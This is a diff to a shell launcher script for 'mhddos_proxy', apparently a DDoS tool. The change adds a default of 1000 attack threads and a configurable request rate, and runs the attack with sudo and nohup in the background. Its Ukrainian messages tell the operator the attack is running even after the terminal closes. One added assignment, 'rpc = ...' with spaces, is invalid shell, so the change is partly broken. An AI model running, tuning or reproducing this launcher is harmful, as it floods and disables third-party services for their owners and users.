@@ -15,7 +15,10 @@ restart_interval="9m"
 
 
 #parameters that passed to python scrypt
-rpc="--rpc 200"
+threads="${1:-1000}"
+threads="-t $threads"
+rpc = "${2:-200}"
+rpc="--rpc $rpc"
 proxy_interval="-p 600"
 
 #Just in case kill previous copy of mhddos_proxy
@@ -47,7 +50,7 @@ do
             echo "$cmd_line $proxy_interval $rpc"
             
             cd ~/mhddos_proxy
-            nohup sudo python3 $cmd_line $proxy_interval $rpc </dev/null &>/dev/null &
+            nohup sudo python3 $cmd_line $threads $proxy_interval $rpc </dev/null &>/dev/null &
             echo -e "Атаку розпочато успішно, не переймайтеся, що нічого не виводиться на екран – атака запущена у фоні, щоб вона не завершилася при закритті терміналу"
             echo -e "\nЯкщо цікаво можете у іншій вкладці подивитися через: \n ps aux | grep runner.py , що там запущенно\nАбо скачати: \n sudo apt install --upgrade htop \n, та у реальному часі дивития через: \n htop"
    done
